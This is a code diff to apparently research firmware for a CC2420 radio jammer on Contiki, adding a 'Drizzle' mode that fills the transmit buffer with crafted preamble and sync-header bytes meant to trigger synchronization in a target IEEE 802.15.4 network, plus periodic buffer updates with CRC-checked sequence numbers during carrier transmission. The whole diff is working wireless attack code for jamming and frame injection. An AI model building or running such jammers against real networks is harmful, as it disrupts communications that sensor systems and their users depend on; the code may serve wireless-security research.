@@ -48,6 +48,7 @@
 #include "lib/random.h"
 #include "dev/radio.h"
 #include "dev/watchdog.h"
+#include "lib/crc16.h"
 #include "cc2420-jammer.h"
 #include "commands.h"
 
@@ -70,7 +71,7 @@
   } while(0)
 
 #define CHANNEL 20
-#define TXPOWER_LEVEL 7
+#define TXPOWER_LEVEL 3
 
 #define TX_INTERVAL (CLOCK_SECOND / 32)
 #define MAX_TX_PACKETS 10
@@ -117,16 +118,26 @@ struct hex_seq
 	const size_t size;
 };
 
-// No. zero preamble nimbles should be equal or greater than target network's SYNWORD setting.
-const static uint8_t hex_seq_1[] = {127, 1, 0x00, 0xA7};
-const static uint8_t hex_seq_2[] = {127, 1, 0x00, 0x00, 0xA7};
-const static uint8_t hex_seq_3[] = {127, 1, 0x06, 0xA7};
+/* Drizzle mode content */
+// No. zero preamble nimbles should be equal or greater than target network's SYNWORD setting in order to trigger RF synchronization.
+// beware of possible extra zero nymbles wrap-around btw. the last byte of TXFIFO and the first byte
+const static uint8_t sfd_1z[] = {0x06, 0xA7, 127};
+const static uint8_t sfd_2z[] = {0x00, 0xA7, 127};
+const static uint8_t sfd_3z[] = {0x06, 0x00, 0xA7, 127};
+const static uint8_t all_zeros[128];
+/* const static uint8_t pellet[128] = {[80]=0x00, 0x00, 0x00, 0xA7, 0x04, 0x30, 0x31, 0xA8, 0x96}; */
+const static uint8_t pellet[128] = {[80]=0x00, 0xA7, 0x04, 0x30, 0x31, 0xA8, 0x96};
+const static uint8_t sfd_1z_packed[] = {0x70, 0xFA, 0x07, 0xA7, 0x7F}; // two sync hdrs, each 2.5 bytes,  squeezed together
 
 const static struct hex_seq droplets[] =	{
-	{hex_seq_1, sizeof(hex_seq_1)},
-	{hex_seq_2, sizeof(hex_seq_2)},
-	{hex_seq_3, sizeof(hex_seq_3)}
+	{sfd_1z, sizeof(sfd_1z)},
+	{sfd_2z, sizeof(sfd_2z)},
+	{sfd_3z, sizeof(sfd_3z)},
+	{all_zeros, sizeof(all_zeros)},
+	{pellet, sizeof(pellet)},
+	{sfd_1z_packed, sizeof(sfd_1z_packed)}
 };
+
 static int droplet_index;
 static uint8_t txfifo_data[128];
 static linkaddr_t dst_addr = { {DST_ADDR0, DST_ADDR1} };
@@ -137,7 +148,6 @@ static struct variable const user_variable_list[] = {
 	{'r', (union number*)&rtimer_interval, sizeof(rtimer_interval), "rtimer_interval", 0, (unsigned)~0},
 	{'y', (union number*)&payload_len, sizeof(payload_len), "payload_len", 0, 127},
 	{'p', (union number*)&max_tx_packets, sizeof(max_tx_packets), "max_tx_packets", 0, (unsigned)~0},
-	/* {'h', (union number*)&hex_seq[0], 1, "hex_seq[0]", 0, 127}, */
 	{'h', (union number*)&droplet_index, 2, "droplet_index", 0, sizeof(droplets)/sizeof(struct hex_seq)-1},
 	/* {'m', (union number*)&mode, sizeof(mode), "mode", 0, LAST_MODE}, */
 	{'d', (union number*)&dst_addr.u8[0], sizeof(dst_addr.u8[0]), "dst_addr.u8[0]", 0, 3},
@@ -180,21 +190,21 @@ print_hex_seq(const char *prefix, const uint8_t *data, size_t size)
 
 /*---------------------------------------------------------------------------*/
 /* CC2420 Serial TX mode */
-static void
-send_serial(struct rtimer *t, void *ptr)
-{
-		if (ptr) {
-			/* schedule next send */
-			rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND / 2, 0, send_serial, (void *)1);
+/* static void */
+/* send_serial(struct rtimer *t, void *ptr) */
+/* { */
+/* 		if (ptr) { */
+/* 			/\* schedule next send *\/ */
+/* 			rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND / 2, 0, send_serial, (void *)1); */
 		
-			/* Test: set first transmitted bit = 1 */
-			CC2420_FIFO_PORT(OUT) |= BV(CC2420_FIFO_PIN);
-			/* Start serial data transmission */
-			CC2420_CLEAR_FIFOP_INT();
-			CC2420_ENABLE_FIFOP_INT();
-			strobe(CC2420_STXON);
-		}
-}
+/* 			/\* Test: set first transmitted bit = 1 *\/ */
+/* 			CC2420_FIFO_PORT(OUT) |= BV(CC2420_FIFO_PIN); */
+/* 			/\* Start serial data transmission *\/ */
+/* 			CC2420_CLEAR_FIFOP_INT(); */
+/* 			CC2420_ENABLE_FIFOP_INT(); */
+/* 			strobe(CC2420_STXON); */
+/* 		} */
+/* } */
 /*---------------------------------------------------------------------------*/
 /* Periodic Droplet transmission */
 static void
@@ -219,6 +229,7 @@ send_len_buf(struct rtimer *t, void *ptr)
 			rtimer_set(&rt, rt.time + rtimer_interval, 0, send_len_buf, (void *)1);
 	}
 }
+
 /*---------------------------------------------------------------------------*/
 /* Reset transmitter to normal packet mode */
 static void
@@ -376,22 +387,53 @@ droplet_mode(int new_mode)
 	rtimer_set(&rt, RTIMER_NOW() + rtimer_interval - 4 + (random_rand()%9) , 0, send_len_buf, (void *)1);
 }
 
+// Periodic TXFIFO update (used during Drizzle transmission)
+static void
+update_txfifo(struct rtimer *t, void *ptr)
+{
+	// packet consists of a sequence number
+#define HLEN 5 // header len : preamble+sync+payload_len
+#define PLEN 2 // payload len
+#define CLEN 2 // checksum len
+	static uint8_t snippet[HLEN+PLEN+CLEN] = {0x00, 0x00, 0x00, 0xCD, PLEN+CLEN};
+	unsigned short checksum;
+	static uint16_t seqno;
+
+	seqno = ptr ? 0 : seqno+1;
+	snippet[HLEN] = (uint8_t)(seqno & 0xFF);
+	snippet[HLEN+1] = (uint8_t)(seqno >> 8);
+
+	checksum = crc16_data(&snippet[HLEN], PLEN, 0);
+	snippet[PLEN+HLEN] = (uint8_t)(checksum & 0xFF);
+	snippet[PLEN+HLEN+1] = (uint8_t)(checksum >> 8);
+
+	CC2420_WRITE_RAM(&snippet, CC2420RAM_TXFIFO, HLEN+PLEN+CLEN);
+
+	rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND*4096L/1000000L+1, 0, update_txfifo, (void *)0);
+}
+
 static void
 drizzle_mode(int new_mode)
 {
-	// TEST: send Drizzle with wrong synch header, in order to create attack solely by including sending Droplet headers in the payload
-	setreg(CC2420_SYNCWORD, 0xCD0F);
+	/* // TEST: send Drizzle with wrong synch header, in order to create attack solely by including sending Droplet headers in the payload */
+	/* setreg(CC2420_SYNCWORD, 0xCD0F); */
 	printf("SYNCWORD=0x%02x\n", getreg(CC2420_SYNCWORD));
 	
-	pad(txfifo_data, sizeof(txfifo_data), droplets[droplet_index].data, droplets[droplet_index].size, inc_first_byte);
+	struct hex_seq seq = droplets[droplet_index];
+	pad(txfifo_data, sizeof(txfifo_data), seq.data, seq.size, NULL);
 
 	// Debug print
-	print_hex_seq("Droplet header: ", droplets[droplet_index].data, droplets[droplet_index].size);
+	print_hex_seq("Droplet header: ", seq.data, seq.size);
 	print_hex_seq("TXFIFO: ", txfifo_data, sizeof(txfifo_data));
 
 	CC2420_WRITE_FIFO_BUF(txfifo_data, 128);
 	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
 	send_carrier(mode);
+
+	// TEST: automatically update Drizzle content continuously during transmssion
+	if (!seq.data[0] && !seq.data[1] && !seq.data[2]) {
+		rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND/256, 0, update_txfifo, (void *)1);
+	}
 }
 
 /* Reactive jamming */
@@ -454,7 +496,7 @@ tx_eth(void)
 #define REVERSE_PHASE(octet)	( ((((octet>>4)+8)%16)<<4) + ((octet&0x0f)+8)%16 )
 #define MOD_MODE_BIT 4
 #define MOD_MODE_BV (1<<MOD_MODE_BIT)
-		uint8_t sync_hdr[] = {0x00, 0xA7, 0x7F}; // RP: 0x88, 0x2F, 0xF7
+		uint8_t sync_hdr[] = {0x00, 0x00, 0xA7, 0x7F}; // RP: 0x88, 0x2F, 0xF7
 		// In case in RP mode, reverse SYNC header back to normal mode
 		if (getreg(CC2420_MDMCTRL1) & MOD_MODE_BV) {
 			for (i = 0;i < sizeof(sync_hdr);i++) {
@@ -527,7 +569,6 @@ attack_eth(void)
 {
 	etimer_stop(&et);
 	rt.ptr = NULL; 		// stop rtimer
-	setreg(CC2420_SYNCWORD, 0xA70F);
 	reset_transmitter();
 	printf("Finished transmission after %lu seconds\n",
 				 (et.timer.interval + CLOCK_SECOND/2) / CLOCK_SECOND);
